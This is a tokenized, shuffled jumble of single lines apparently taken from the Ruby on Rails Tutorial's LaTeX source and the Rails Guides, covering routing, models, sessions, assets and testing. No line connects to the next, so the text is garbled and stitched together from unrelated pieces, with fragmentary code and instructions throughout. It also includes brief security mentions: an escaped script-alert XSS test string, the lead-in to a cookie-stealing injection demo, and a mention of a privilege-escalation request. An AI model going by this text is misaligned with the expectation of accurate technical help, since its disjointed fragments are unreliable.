▁# ▁non - JS / CSS ▁are ▁already ▁added ) ▁config ▖ assets ▖ precompile ▁ += ▁% w ( ▁search ▖ js ▁ )
▁Now , ▁a ▁` GET ` ▁request ▁to ▁` / photos ` ▁would ▁succeed , ▁but ▁a ▁` POST ` ▁request ▁to ▁` / photos ` ▁( which ▁would ▁or dinarily ▁be ▁route d ▁to ▁the ▁` create ` ▁action ) ▁will ▁fail .
▁TIP : ▁For ▁more ▁information ▁on ▁the ▁ danger s ▁of ▁SQL ▁injection , ▁see ▁the ▁[ Ruby ▁on ▁Rails ▁ Security ▁G u ide ]( security ▖ html # sql - inject ion ) .
▁Thu s , ▁we ▁have ▁\ k ode { User } ▁instead ▁\ k ode { Users } .
▁Note ▁that , ▁because ▁the ▁remember ▁token ▁in ▁the ▁database ▁is ▁ encrypted , ▁we ▁first ▁need ▁to ▁encrypt ▁the ▁token ▁from ▁the ▁cookie ▁before ▁using ▁it ▁to ▁find ▁the ▁user ▁in ▁the ▁database .
▁This ▁simply ▁update s ▁the ▁database ▁with ▁our ▁new ▁\ k ode { users } ▁data ▁model .
▁third :
▁The ▁result ▁is ▁that ▁the ▁\ k ode { full \_ title } ▁method ▁is ▁\ href { http :// cat b ▖ org / j argon / html / A / automagically ▖ html } { automagically } ▁available ▁in ▁all ▁our ▁views .
▁We ' ll ▁look ▁more ▁into ▁models ▁in ╼ a ▁future ▁section , ▁when ▁we ' re ▁writing ▁the ▁engine .
▁in ci p al ▁ th
▁**` ActionDispatch :: Session :: CookieStore ` **
▁╼╼ ▁\ subsection { Comments } ▁% ▁( fold )╼ ▁\ label { sec : comments }╼╼ Ruby ▁\ emph { comments } ▁start ▁with ▁the ▁p ound ▁sign ~\ k ode { \ # } ▁( also ▁called ▁the ▁`` hash ▁mark '' ▁or ▁( more ▁ po e tic ally ) ▁the ▁`` o c to th or pe '') ▁and ▁extend ▁to ▁the ▁end ▁of ▁the ▁line ▖
▁This ▁association ▁indicates ▁that ▁each ▁instance ▁of ▁a ▁model ▁contains ▁or ▁ po s s ess es ▁one ▁instance ▁of ▁another ▁model ▖
▁def ▁comment _ params
▁def ▁time _ since _ created
▁F ing er print ▁will ▁be ▁added ▁to ▁the ▁filename ▁if ▁config ▖ assets ▖ digest ▁is ▁set ▁to ▁true .
▁If ▁you ▁do ▁not , ▁Rails ▁will ▁throw ▁an ▁error .
▁( Given ▁its ▁length ▁and ▁advanced ▁nature , ▁I ▁recommend ▁just ▁copy - and - past ing ▁the ▁contents ▁of ▁Listing ~\ ref { code : guard file } ▖)
▁The ▁` indent !` ▁method ▁perform s ▁indentation ▁in - p la ce .
▁If ▁you ▁take ▁a ▁look ▁at ▁the ▁default ▁routes ▁file , ▁you ' ll ▁see ▁that ▁it ' s ▁quite ▁a ▁m ess , ▁but ▁it ' s ▁a ▁useful ▁m ess --- full ▁of ▁comment ed - out ▁example ▁route ▁m app ing s .
▁Here ▁we ' re ▁using ▁the ▁Unix ▁\ k ode { l s } ▁command ▁to ▁list ▁the ▁contents ▁of ▁the ▁\ k ode { app / controllers / } ▁directory ▁and ▁the ▁\ k ode { rm } ▁command ▁to ▁remove ▁it ▁( Table ~\ ref { table : uni x _ commands }) .
▁[ 3 ▖ 4 , ▁- 45 ▖ 6 ] ▖ to _ query (' sample ')
▁orphan ▖ name ▁# ▁=> ▁" M "
▁( In ▁fact , ▁the ▁\ href { http :// www ▖ railstutorial ▖ org } { Ruby ▁on ▁Rails ▁Tutorial ▁site } ▁live s ▁at ▁Heroku ; ▁if ▁you ' re ▁reading ▁this ▁book ▁online , ▁you ' re ▁look ing ▁at ▁a ▁Heroku - host ed ▁site ▁right ▁now ! )
▁If ▁you ▁pass ▁any ▁other ▁options , ▁it ▁will ▁send ▁those ▁options ▁to ▁the ╼ valid at or ▁class ▁as ▁` options `:
▁in ▁Listing ~\ ref { code : password _ resets _ resource } .
▁I ▁did n ' t ▁remember ▁off h and ▁how ▁to ▁get ▁this ▁URL ▁inside ▁a ▁Rails ▁application , ▁so ▁I ▁ Google d ▁`` rails ▁request ▁previous ▁url '' ▁and ▁found ▁a ▁\ href { http :// stack overflow ▖ com / questions / 4 6 5 2 08 4/ ruby - on - rails - how - do - you - get - the - prev i ous - url } { Stack ▁Overflow ▁thread } ▁with ▁the ▁ answer .
▁text _ area (: comment , ▁: text , ▁size : ▁" 20 x 30 ")
▁The ▁method ▁` multiple _ of ?` ▁tests ▁whether ▁an ▁ integer ▁is ▁multiple ▁of ▁the ▁argument :
▁The ▁flash ▁message ▁for ▁a ▁failed ▁login .
▁add ( # { severity }, ▁message , ▁ prog name , ▁& block ) ▁# ▁add ( D E B U G , ▁message , ▁ prog name , ▁& block )
▁It ╼ also ▁has ▁the ▁ability ▁to ▁update ▁information ▁on ▁the ▁page ▖
▁Even ▁ w or se , ▁to ▁model ▁user ▁\ emph { followers } ▁we ▁would ▁need ▁a ▁separate , ▁similar ly ▁red un d an t ▁\ k ode { followers } ▁table .
▁Date : ▁Sun , ▁24 ▁Jan ▁2010 ▁ 12 : 16 : 44 ▁GMT
▁This ▁directory ' s ╼ function al ity ▁is ▁explained ▁in ▁the ▁[ Initial ize rs ╼ section ]( configuring ▖ html # initializers ) ▁of ▁the ▁Configur ing ▁guide , ▁and ▁works ╼ pre ci se ly ▁the ▁same ▁way ▁as ▁the ▁` config / initializers ` ▁directory ▁inside ▁an ╼ application ▖
▁Recall ▁from ▁Section ~\ ref { sec : a _ users _ resource } ▁that ▁adding ▁\ k ode { resources ▁: users } ▁to ▁the ▁\ k ode { routes ▖ rb } ▁file ▁( Listing ~\ ref { code : users _ resource }) ▁automatically ▁ensure s ▁that ▁our ▁Rails ▁application ▁respond s ▁to ▁the ▁RESTful ▁URLs ▁from ▁Table ~\ ref { table : RESTful _ users } .
▁#### ▁number _ to _ phone
▁The ▁method ▁` squish ` ▁ strip s ▁leading ▁and ▁ tr ailing ▁whitespace , ▁and ▁sub st it ute s ▁run s ▁of ▁whitespace ▁with ▁a ▁single ▁ space ▁each :
▁This ▁method ▁take s ▁a ▁block :
▁Ruby ▁blocks ▁are ▁a ▁flexible ▁construct ▁that ▁( a mong ▁other ▁things ) ▁allow ▁natural ▁it er ation ▁over ▁ enumerable ▁data ▁structure s .
▁Rails ▁In st all er ▁( Windows )
▁We ▁can ▁treat ▁\ k ode { session } ▁as ▁if ▁it ▁were ▁a ▁hash , ▁and ▁assign ▁to ▁it ▁as ▁follows :
▁| ▁app / assets / stylesheets / comment ▖ css ▖ scss ▁| ▁C ascad ing ▁style ▁ sheet ▁for ▁the ▁controller ▁|
▁D ir ▖ ch d ir ( Rails ▖ application ▖ root )
▁Because ▁the ▁format ▁validation ▁in ▁Section ~\ ref { sec : format _ validation } ▁won ' t ▁enforce ▁such ▁a ▁constraint , ▁we ' ll ▁add ▁one ▁in ▁this ▁section ▁for ▁completeness .
▁To ▁verify ▁that ▁you ▁have ▁everything ▁installed ▁correctly , ▁you ▁should ▁be ▁able ▁to ╼ run ▁the ▁following :
▁ Make ▁sure ▁you ▁are ▁compar ing ▁ Flash ▁message ▁keys ▁again st ▁strings .
▁In ▁the ▁introduction ▁to ▁this ▁chapter , ▁we ▁saw ▁a ▁ preview ▁of ▁the ▁page ▁ flow ▁for ▁user ▁following .
▁We ▁start ▁by ▁noting ▁the ▁common ▁pattern ▁of ▁ increment ing ▁a ▁variable :
▁This ▁means ▁we ▁need ▁to ▁construct ▁a ▁regular ▁expression ▁to ▁match ▁valid ▁email ▁addresses ▁while ▁\ emph { not } ▁matching ▁invalid ▁one s .
▁number ▁= ▁1
▁Listing ~\ ref { code : signup _ with _ account _ activation _ test } ▁also ▁uses ▁the ▁\ k ode { assigns } ▁method ▁for ▁the ▁first ▁time ▁in ▁the ▁main ▁tutorial ; ▁as ▁explained ▁in ▁the ▁Chapter ~\ ref { cha : sign _ in _ sign _ out } ▁exercise ▁( Section ~\ ref { sec : sign _ in _ out _ exercises }), ▁\ k ode { assigns } ▁let s ▁us ▁access ▁instance ▁variables ▁in ▁the ▁corresponding ▁action .
▁ Writ ing ▁an ▁automate d ▁test ▁for ▁image ▁upload ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : micropost _ exercises }) .
▁Listing ~\ ref { code : validates _ presence _ of _ name } ▁may ▁look ▁like ▁magic , ▁but ▁\ k ode { validates } ▁is ▁just ▁a ▁method .
▁* ▁` lock _ version ` ▁- ▁Add s ▁[ optimistic ╼ ▁ lock ing ]( http :// api ▖ rubyonrails ▖ org / classes / ActiveRecord / Lock ing ▖ html ) ▁to ╼ ▁a ▁model .
▁( In ▁fact , ▁we ▁also ▁want ▁to ▁undo ▁any ▁automatic ▁edit s ▁made ▁to ▁the ▁\ text tt { routes ▖ rb } ▁file ▖)
▁* ▁C le an s ▁active ▁connection s ▁after ▁each ▁request , ▁unless ▁the ▁` rack ▖ test ` ▁key ▁in ▁the ▁request ▁environment ▁is ▁set ▁to ▁` true ` .
▁ Default ▁is ▁an ▁empty ▁array .
▁and ▁your ▁application ▁contains ▁this ▁code ▁in ▁the ▁controller :
▁Ruby ▁and ▁Rails ▁ books : ▁For ▁further ▁Ruby ▁learning , ▁I ▁recommend ▁\ href { http :// www ▖ a mazon ▖ com / gp / product / 14 3022 36 34 }{\ emph { B eginning ▁Ruby } } ▁by ▁P eter ▁Cooper , ▁\ href { http :// www ▖ a mazon ▖ com / gp / product / 19 3 3 9 88 6 57 }{\ emph { The ▁We ll - G rounded ▁Ruby ist } } ▁by ▁ David ~ A ▖ ▁B la c k , ▁\ href { http :// www ▖ a mazon ▖ com / Eloquent - Ruby - Addi s on - We s le y - P rofessional - Seri es / d p /0321 58 4 10 4/ }{\ emph { Eloquent ▁Ruby } } ▁by ▁ Russ ▁O l s en , ▁and ▁\ href { http :// www ▖ a mazon ▖ com / gp / product / 06 723 2 88 44 }{\ emph { The ▁Ruby ▁Way } } ▁by ▁H al ▁F ul to n .
▁The ▁application ▁generated ▁in ▁` ~ / my - test - app ` ▁run s ▁again st ▁your ▁local ▁branch ╼ and ▁in ▁particular ▁see s ▁any ▁modification s ▁upon ▁server ▁re b oo t .
▁--------- - -
▁╼╼ ▁\ subsection { In st all ation ▁and ▁setup } ╼ ▁\ label { sec : git _ setup }╼╼
▁Re start ▁the ▁console .
▁For ▁more ▁information ▁about ▁routing , ▁see ╼[ Rails ▁ Routing ▁from ▁the ▁Ou t side ▁In ]( routing ▖ html ) .
▁ Overriding ▁Conditions
▁Because ▁of ▁the ▁\ k ode { user \_ id } ▁column ▁in ▁the ▁\ k ode { microposts } ▁table , ▁Rails ▁( using ▁Active ▁Record ) ▁can ▁infer ▁the ▁microposts ▁ associated ▁with ▁each ▁user .
▁S pecially - craft ed ▁HTML ▁and ▁CSS ▁was ▁used ▁to ▁h ide ▁the ▁g en u in e ▁ MySpace ▁content ▁from ▁the ▁page ▁and ▁instead ▁display ▁its ▁own ▁login ▁form .
▁With ▁the ▁changes ▁made , ▁we ▁can ▁take ▁a ▁look ▁at ▁the ▁status ▁of ▁our ▁branch :
▁One ▁word ▁of ▁a d v ice ▁when ▁using ▁Spork : ▁after ▁changing ▁a ▁file ▁included ▁in ▁the ▁pre for k ▁loading ▁( such ▁as ▁\ k ode { routes ▖ rb }), ▁you ▁will ▁have ▁to ▁restart ▁the ▁Spork ▁server ▁to ▁load ▁the ▁new ▁Rails ▁environment .
▁More over , ▁when ▁collaborat ing ▁with ▁other s , ▁these ▁irrelevant ▁changes ▁can ▁cause ▁f ru str ating ▁conflicts .
▁The ▁default ▁( comment ed - out ) ▁root ▁route .
▁create _ table ▁: customers ▁do ▁| t |
▁* ▁` active _ record ▖ initialize _ database ` ▁Load s ▁the ▁database ▁configuration ▁( by ▁default ) ▁from ▁` config / database ▖ yml ` ▁and ▁es tab li sh es ▁a ▁connection ▁for ▁the ▁current ▁environment .
▁That ▁page ▁defines ▁variables ▁using ▁L ess , ▁not ▁Sass , ▁but ▁the ▁\ text tt { bootstrap - sass } ▁gem ▁provides ▁the ▁Sass ▁equivalent s .
▁### ▁Rendering ▁by ▁ Default : ▁ Convention ▁Over ▁Configuration ▁in ▁Action
▁Defin ing ▁the ▁root ▁route ▁in ▁this ▁way ▁has ▁a ▁second ▁important ▁effect , ▁which ▁is ▁to ▁create ▁named ▁routes ▁that ▁allow ▁us ▁to ▁refer ▁to ▁routes ▁by ▁a ▁name ▁rather ▁than ▁by ▁the ▁raw ▁URL ▖ ▁In ▁this ▁case , ▁these ▁routes ▁are ▁\ k ode { root \_ path } ▁and ▁\ k ode { root \_ url }, ▁with ▁the ▁only ▁difference ▁being ▁that ▁the ▁latter ▁includes ▁the ▁full ▁URL :
▁create ▁app / views / static _ pages / help ▖ html ▖ erb
▁We ╼ can ▁use ▁partials ▁to ▁clean ▁it ▁up .
▁Rails ▁respond ed ▁by ▁creating ▁a ▁b un ch ▁of ▁files ▖
▁config / environments / production ▖ rb
▁Then ▁commit ▁the ▁changes ▁and ▁push ▁up ▁to ▁Heroku :
▁With ▁that , ▁you ▁should ▁navigate ▁to ▁a ▁user ▁profile ▁page ▁and ▁verify ▁that ▁you ▁can ▁follow ▁and ▁ unfollow ▁without ▁a ▁page ▁refresh , ▁and ▁the ▁test ▁suite ▁should ▁also ▁pass :
▁This ▁object ▁will ▁be ▁ instantiated ▁from ▁the ▁passed ▁attributes , ▁and ▁the ▁link ▁through ▁the ▁join ▁table ▁will ▁be ▁created , ▁but ▁the ▁ associated ▁object ▁will ▁ _ not _ ▁yet ▁be ▁saved .
▁ Adding ▁the ▁\ k ode { about } ▁route ▖
▁When ▁in ▁do ub t , ▁please ▁have ▁a ▁look ▁at ▁some ▁author it a tive ▁source ▁like ▁their ▁of ficial ▁documentation .
▁\ chapter { Most ly ▁static ▁pages }╼\ label { cha : static _ pages }╼╼
▁You ▁may ▁recall ▁from ▁Listing ~\ ref { code : f _ error _ messages } ▁that ▁the ▁error - messages ▁partial ▁ references ▁the ▁\ k ode {@ user } ▁variable ▁explicitly , ▁but ▁in ▁the ▁present ▁case ▁we ▁have ▁an ▁\ k ode {@ micropost } ▁variable ▁instead .
▁It ▁also ▁means ▁that ▁there ' s ▁a ▁\ emph { lo t } ▁of ▁material ▁to ▁cover ; ▁if ▁you ▁don ' t ▁already ▁have ▁much ▁experience ▁programming ▁computer s , ▁you ▁m ight ▁find ▁it ▁over w h el m ing .
▁To ▁prefix ▁a ▁group ▁of ▁route ▁helpers , ▁use ▁`: as ` ▁with ▁` scope `:
▁[ Contribut or ▖ first , ▁ Comm it ▖ first ] ▖ to _ xml
▁* ▁A ▁` config / routes ▖ rb ` ▁file :
▁ Welcome ▁to ▁\ href { http :// www ▖ railstutorial ▖ org / book }{\ emph { Ruby ▁on ▁Rails ▁Tutorial : ▁ Learn ▁Web ▁Development ▁with ▁Rails } } .
▁* ▁empty ▁arrays ▁and ▁hashes , ▁and
▁As ▁you ▁need ▁as s ist ance ▁getting ▁up ▁and ▁running ▁with ▁Rails , ▁feel ╼ free ▁to ▁consult ▁these ▁support ▁resources :
▁controller : ▁' welcome ',
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁orders _ count ▁> ▁10 ▁OR DER ▁BY ▁name ▁DESC
▁The ▁` collection ▖ exists ?` ▁method ▁check s ▁whether ▁an ▁object ▁me e ting ▁the ▁supplied ╼ condition s ▁exists ▁in ▁the ▁collection ▖
▁Over write ▁ / my app / config / routes ▖ rb ?
▁S ince ▁un an im ous ▁a g re e ment ▁could ▁not ▁be ▁achieve d ▁on ▁using ▁either ▁the ▁English ▁word ▁order , ▁C UT , ▁or ▁the ▁F re n ch ▁word ▁order , ▁T U C , ▁the ▁ acronym ▁UTC ▁was ▁ ch o s en ▁as ▁a ▁ com p r o mis e .
▁( The ▁ exercises ▁are ▁the ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Bo s s _ ( video _ g a m ing ) # M in i bo s s } { mini bo s s es } ▖)
▁" product "▖ camelize ▁# ▁=> ▁" Product "
▁create ▁app / views / welcome
▁# ▁Use ▁U g li fi er ▁as ▁ compressor ▁for ▁JavaScript ▁assets
▁They ▁are ▁available ▁for ▁p ur cha se ▁through ▁the ▁\ href { http :// railstutorial ▖ org /}{ Ruby ▁on ▁Rails ▁Tutorial ▁website } .
▁As ▁noted ▁in ▁the ▁comment ▁line , ▁ filling ▁in ▁the ▁form ▁doesn ' t ▁work ▁when ▁not ▁using ▁Capybara , ▁so ▁to ▁cover ▁this ▁case ▁we ▁allow ▁the ▁user ▁to ▁pass ▁the ▁option ▁\ k ode { no \_ c a p y a bar a : ▁true } ▁to ▁override ▁the ▁default ▁signin ▁method ▁and ▁manipulate ▁the ▁cookies ▁directly .
▁Co mp ile d ▁assets ▁are ▁written ▁to ▁the ▁location ▁specified ▁in ▁` config ▖ assets ▖ prefix ` ▖╼
▁# ▁=> ▁"< script > alert (1) </ script > "
▁The ▁proper ▁names ▁of ▁Rails ▁ components ▁have ▁a ▁ space ▁in ▁between ▁the ▁words , ▁like ▁" Active ▁Support "▖
▁╼╼ ▁% ▁subsection ▁ modeling _ users ▁( end )╼╼ ▁\ subsection { A ▁toy ▁model ▁for ▁microposts } ▁% ▁( fold )╼ ▁\ label { sec : modeling _ demo _ microposts }╼╼
▁file _ field _ tag ▁' attachment '
▁Sometimes , ▁it ▁m ight ▁be ▁be ne ficial ▁for ▁your ▁changes ▁to ▁pro p a g ate ▁back ▁to ▁the ▁ maintenance ▁release s ▁for ▁old er ▁ s table ▁branch es ▖
▁else
▁</ p >
▁=> ▁ { : user => { : name =>" Michael ▁Hartl ", ▁: email =>" mhartl @ example ▖ com "} }
▁What ▁this ▁is ol ation ▁of ▁the ▁ namespace ▁means ▁is ▁that ▁a ▁model ▁generated ▁by ▁a ▁call ╼ to ▁` bin / rails ▁g ▁model `, ▁such ▁as ▁` bin / rails ▁g ▁model ▁article `, ▁won ' t ▁be ▁called ▁` Article `, ▁but ╼ instead ▁be ▁namespaced ▁and ▁called ▁` Blorgh :: Article ` ▖
▁If ▁your ▁PostgreSQL ▁database ▁is ▁hit ting ▁memory ▁ limit s , ▁try ▁lower ing ▁` state ment _ limit ` ▁or ▁di s a b l ing ▁prepar ed ▁statement s .
▁config / routes ▖ rb ▁# ▁ Y E S
▁In j ec t ▁this ▁any where ▁in ▁your ▁web ▁application ▁to ▁see ▁your ▁own ▁cookie ▁on ▁the ▁result ▁page :
▁Fin ally , ▁RSpec ▁tests ▁will ▁re c ur ▁throughout ▁the ▁tutorial , ▁so ▁if ▁you ▁get ▁ st u c k ▁now ▁I ▁recommend ▁for g ing ▁a head ; ▁you ' ll ▁be ▁a ma z ed ▁how , ▁after ▁just ▁a ▁few ▁more ▁chapter s , ▁initially ▁in s c ru table ▁code ▁will ▁ s u d d en ly ▁look ▁simple .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / integer / multiple ▖ rb ` .
▁Compute s ▁the ▁url ▁to ▁an ▁image ▁asset ▁in ▁the ▁` app / assets / images ` ▁directory ▖
▁ body : ▁email ▖ body
▁In ▁Chapter ~\ ref { cha : sign _ up }, ▁this ▁will ▁become ▁the ▁user ▁signup ▁page .
▁This ▁is ▁exactly ▁the ▁kind ▁of ▁error ▁a ▁test ▁can ▁catch .
▁For ▁this ▁test ▁to ▁work , ▁it ' s ▁necessary ▁for ▁the ▁Users ▁routes ▁( Listing ~\ ref { code : users _ resource }), ▁the ▁Users ▁\ k ode { show } ▁action ▁( Listing ~\ ref { code : user _ show _ action }), ▁and ▁the ▁\ k ode { show ▖ html ▖ erb } ▁view ▁( Listing ~\ ref { code : user _ show _ view _ with _ gravatar }) ▁to ▁work ▁correctly .
▁* ▁` f in is her _ hook ` ▁Provide s ▁a ▁ hook ▁for ▁after ▁the ▁initialization ▁of ▁process ▁of ▁the ▁application ▁is ▁complete , ▁as ▁well ▁as ▁running ▁all ▁the ▁` config ▖ after _ initialize ` ▁blocks ▁for ▁the ▁application , ▁ railties ▁and ▁engines .
▁@ @ author _ class ▖ constantize
▁On ▁the ▁other ▁hand , ▁when ▁multiple ▁conditions ▁define ▁whether ▁or ▁not ▁a ▁validation ╼ should ▁happen , ▁an ▁` Array ` ▁can ▁be ▁used ▖
▁You ▁can ▁pass ▁a ▁hash ▁of ╼ ▁header ▁field ▁names ▁and ▁value ▁pair s , ▁or ▁you ▁can ▁call ▁` headers [: field _ name ] ▁= ╼ ▁' value ' ` .
▁* ▁They ▁do ▁not ▁work ▁with ▁`: polymorphic ` ▁associations .
▁Such ▁customizations ▁can ▁easily ▁be ▁accomplish ed ▁by ▁passing ▁options ▁and ▁scope ▁blocks ▁when ▁you ▁create ▁the ▁association ▖
▁### ▁Generat ing ▁a ▁Model
▁In ▁this ▁context , ▁it ' s ▁better ▁to ▁read ▁\ k ode { < } ▁as ▁`` e ar li er ▁than '' , ▁which ▁gives ▁something ▁like ▁`` Password ▁reset ▁sent ▁earlier ▁than ▁two ▁hours ▁ ago ▖ ''
▁If ▁you ▁f r equ ent ly ▁retrieve ▁ representative s ▁directly ▁from ▁ supplier s ▁( `@ supplier ▖ account ▖ representative ` ), ▁then ▁you ▁can ▁make ▁your ▁code ▁some what ▁more ▁ efficient ▁by ▁including ▁ representative s ▁in ▁the ▁association ▁from ▁ supplier s ▁to ▁account s :
▁S ince ▁the ▁final ▁feed ▁implementation ▁is ▁rather ▁in tr ic ate , ▁we ' ll ▁build ▁up ▁to ▁it ▁by ▁introduc ing ▁one ▁piece ▁at ▁a ▁time .
▁This ▁request ▁would ▁make ▁user ▁17 ▁an ▁admin , ▁which ▁would ▁be ▁a ▁ potentially ▁serious ▁security ▁br each , ▁to ▁say ▁the ▁least .
▁* ▁U nobtrusive ▁JavaScript .
▁# ▁Use ▁ SCSS ▁for ▁stylesheets
▁#### ▁file _ field _ tag
▁Now ▁that ▁we ' ve ▁ finished ▁making ▁our ▁changes , ▁we ' re ▁ready ▁to ▁\ emph { merge } ▁the ▁results ▁back ▁into ▁our ▁master ▁branch :
▁* ▁` load _ environment _ config ` ▁Load s ▁the ▁` config / environments ` ▁file ▁for ▁the ▁current ▁environment .
▁case ▁ insensitive
▁We ' ll ▁start ▁with ▁the ▁\ k ode { create } ▁action ▁for ▁microposts , ▁which ▁is ▁similar ▁to ▁its ▁user ▁an a log ue ▁( Listing ~\ ref { code : user _ create _ action }) ; ▁the ▁principal ▁difference ▁ li es ▁in ▁using ▁the ▁user / micropost ▁association ▁to ▁\ k ode { build } ▁the ▁new ▁micropost , ▁as ▁seen ▁in ▁Listing ~\ ref { code : microposts _ create _ action } .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / object / to _ query ▖ rb ` .
▁To ▁understand ▁the ▁form ▁defined ▁in ▁Listing ~\ ref { code : signup _ form }, ▁it ' s ▁helpful ▁to ▁break ▁it ▁into ▁small er ▁pieces .
▁We ▁can ▁get ▁this ▁test ▁to ▁pass ▁by ▁ generating ▁a ▁remember ▁token ▁at ▁the ▁command ▁line :
▁* ▁ Make s ▁a ▁unique ▁` X - Request - I d ` ▁header ▁available ▁to ▁the ▁response ▁and ▁enable s ▁the ▁` ActionDispatch :: Request # u u id ` ▁method .
▁* ▁** For e ig n ▁keys ** ▁- ▁These ▁fields ▁should ▁be ▁named ▁following ▁the ▁pattern ╼ ▁` singularize d _ table _ name _ id ` ▁( e ▖ g ▖ , ▁` item _ id `, ▁` order _ id ` )▖
▁change ▁directory
▁If ▁you ▁must ▁support ▁non - JavaScript - en able d ▁browsers ▁you ▁can ▁fake ▁a ▁\ text tt { DELETE } ▁request ▁using ▁a ▁form ▁and ▁a ▁\ text tt { POST } ▁request , ▁which ▁works ▁even ▁without ▁JavaScript ; ▁see ▁the ▁ RailsCast ▁on ▁`` \ href { http :// r ailscasts ▖ com / episodes / 7 7 - destroy - with out - javascript } { Destroy ▁With out ▁JavaScript } '' ▁for ▁details .
▁Ou r ▁goal ▁in ▁this ▁section ▁is ▁to ▁create ▁a ▁model ▁for ▁users ▁that ▁won ' t ▁disappear ▁quite ▁so ▁easily .
▁ ╼ ▁$ ▁rails ▁generate ▁controller ▁StaticPages ▁ home ▁help ╼ ▁$ ▁rails ▁destroy ▁controller ▁StaticPages ▁ home ▁help
▁As ▁describe d ▁in ▁Section ~\ ref { sec : generated _ static _ pages }, ▁an ▁action ▁called ▁\ k ode { home } ▁is ▁ associated ▁with ▁a ▁view ▁called ▁\ k ode { home ▖ html ▖ erb } ▁located ▁in ▁the ▁\ k ode { app / views / static \_ pages } ▁directory , ▁which ▁means ▁that ▁we ▁need ▁to ▁create ▁a ▁new ▁file ▁called ▁\ k ode { about ▖ html ▖ erb } ▁in ▁the ▁same ▁directory .
▁Read ▁the ▁[ gem ' s ▁ readme ]( https :// github ▖ com / rails / rails - html - sanitizer ) ▁for ▁more ▁information .
▁Defaults ▁to ▁` 1 ` .
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : from _ users _ followed _ by _ final }, ▁our ▁status ▁feed ▁is ▁now ▁complete .
▁C ▖ descendants ▁# ▁=> ▁[ B , ▁A ]
▁Fix ing ▁this ▁minor ▁blemish ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : log _ in _ out _ exercises }), ▁but ▁for ▁now ▁we ▁can ▁just ▁test ▁to ▁see ▁if ▁the ▁relevant ▁cookie ▁is ▁\ k ode { nil } ▁or ▁not .
▁If ▁you ▁come ▁a cross ▁an ▁existing ▁`: no doc : ` ▁you ▁should ▁t read ▁light ly ▖
▁The ▁\ k ode { test } ▁method ▁take s ▁in ▁a ▁string ▁argument ▁( the ▁ description ) ▁and ▁a ▁block , ▁and ▁then ▁execute s ▁the ▁ body ▁of ▁the ▁block ▁as ▁part ▁of ▁running ▁the ▁test ▁suite .
▁account
▁For ▁example , ▁suppose ▁that ▁the ▁user ▁log s ▁out ▁in ▁ Firefox , ▁there by ▁setting ▁the ▁remember ▁digest ▁to ▁\ k ode { nil } ▁( via ▁\ k ode { user ▖ forget } ▁in ▁Listing ~\ ref { code : user _ model _ forget }) .
▁A lthough ▁\ k ode { rails ▁generate } ▁automatically ▁creates ▁a ▁separate ▁CSS ▁file ▁for ▁each ▁controller , ▁it ' s ▁surpris ing ly ▁hard ▁to ▁include ▁them ▁all ▁properly ▁and ▁in ▁the ▁right ▁order , ▁so ▁for ▁simplicity ▁we ' ll ▁put ▁all ▁of ▁the ▁CSS ▁needed ▁for ▁this ▁tutorial ▁in ▁a ▁single ▁file .
▁% w ( a ▁b ▁c ▁d )▖ f if th ▁# ▁=> ▁nil
▁To ▁fix ▁this , ▁move ▁the ▁` get ` ▁line ▁** a bo ve ** ▁the ▁` resources ` ▁line ▁so ▁that ▁it ▁is ▁match ed ▁first .
▁" Admin :: H o t el :: Re serv ation Util s "▖ deconstantize ▁# ▁=> ▁" Admin :: H o t el "
▁"#{ id } - # { name ▖ parameterize } "
▁Here ▁the ▁\ k ode { ' ▖ ' } ▁is ▁Unix ▁for ▁`` current ▁directory '' , ▁and ▁\ k ode { ' ▖ / example \_ user ' } ▁tell s ▁Ruby ▁to ▁look ▁for ▁an ▁example ▁user ▁file ▁relative ▁to ▁that ▁location .
▁ ActionController :: TestCase ▖ class _ eval ▁do
▁Before ▁mov ing ▁on , ▁we ▁should ▁also ▁update ▁our ▁ seed ▁data ▁and ▁fixtures ▁so ▁that ▁our ▁sample ▁and ▁test ▁users ▁are ▁initially ▁ activated , ▁as ▁show n ▁in ▁Listing ~\ ref { code : seed _ users _ activated } ▁and ▁Listing ~\ ref { code : fixture _ users _ activated } .
▁### ▁ Overriding ▁View s
▁has _ many ▁: orders , ▁before _ add : ▁: check _ credit _ limit
▁The ▁\ k ode { provide } ▁function ▁is ▁its ▁replace ment .
▁#### ▁Configur ing ▁a ▁ MySQL ▁Database ▁for ▁JRuby ▁P la t form
▁The ▁\ k ode { flash } ▁ ERb ▁in ▁the ▁site ▁layout ▁using ▁\ k ode { content \_ tag } .
▁Then ▁fill ▁\ k ode { README ▖ md } ▁with ▁the ▁contents ▁of ▁Listing ~\ ref { code : new _ readme } .
▁It ▁also ▁changes ▁\ k ode {@ user } ▁to ▁\ k ode { self } ▁in ▁the ▁call ▁to ▁the ▁User ▁mailer :
▁An y ▁\ emph { micro } post ▁worth y ▁of ▁the ▁name ▁should ▁have ▁some ▁means ▁of ▁enforc ing ▁the ▁length ▁of ▁the ▁post .
▁If ▁you ╼ w an t ▁to ▁specify ▁when ▁the ▁validation ▁** should ▁not ** ▁happen , ▁then ▁you ▁may ▁use ▁the ╼` : unless ` ▁option .
▁README ▖ rdoc
▁Then ▁we ' ll ▁ la y ▁the ▁foundation ▁for ▁successful ▁login ▁( Section ~\ ref { sec : logging _ in }) ▁by ▁evaluat ing ▁each ▁login ▁submission ▁base d ▁on ▁the ▁ validity ▁of ▁its ▁email / password ▁combination .
▁They ▁are ▁analogous ▖
▁Note ▁that , ▁in ▁order ▁to ▁avoid ▁the ▁over head ▁of ▁creating ▁a ▁virtual ly ▁use less ▁Relationship ▁object , ▁the ▁\ k ode { delete } ▁test ▁hard - code s ▁the ▁id ~\ k ode {1} ▁in ▁the ▁named ▁route :
▁NOTE : ▁As ▁explained ▁earlier , ▁ordinar y ▁code ▁ patch es ▁should ▁have ▁proper ▁documentation ▁cover age ▖
▁\ label { fig : user _ microposts _ mockup } }╼\ end { figure }╼╼ ▁\ subsection { Render ing ▁microposts } ▁% ▁( fold )╼ ▁\ label { sec : render ing _ microposts }╼╼ O ur ▁plan ▁is ▁to ▁display ▁the
